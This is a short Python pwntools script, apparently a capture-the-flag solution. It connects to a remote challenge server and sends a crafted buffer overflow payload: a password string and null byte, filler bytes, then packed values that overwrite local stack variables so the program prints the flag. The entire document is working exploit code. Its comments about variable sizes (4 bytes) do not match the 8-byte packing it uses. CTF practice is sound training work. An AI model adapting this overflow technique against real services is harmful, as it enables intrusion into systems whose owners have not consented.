from pwn import *

# Setup pwntools context
context.log_level = 'debug'

# Connect to the netcat instance
io = remote('anveshanam.net', 10045)

# Crafted input with buffer overflow
payload = b'kalki2898AD' + b'\x00'  # Ensure null termination after the correct answer

# Fill up to reach local_1c after local_68
payload += b'A' * (64 - len(payload))  # Fill up to reach local_1c
 
# Add padding to skip over local_28 (FILE*)
#payload += b'B' * 8  # Assuming local_28 is 8 bytes (adjust if different on your system)

# Overwrite local variables in correct order
  
  # padding to skip over local_28 (FILE*) - 4 bytes
payload += p64(100)    # local_c (4 bytes)
payload += p64(0xfa)   # local_10 (4 bytes)
payload += p64(200)    # local_14 (4 bytes)
payload += p64(0x32)   # local_18 (4 bytes)
payload += p64(100) 

# Send the payload
io.sendline(payload)

# Receive and print output (which should include the flag if successful)
print(io.recvall().decode())
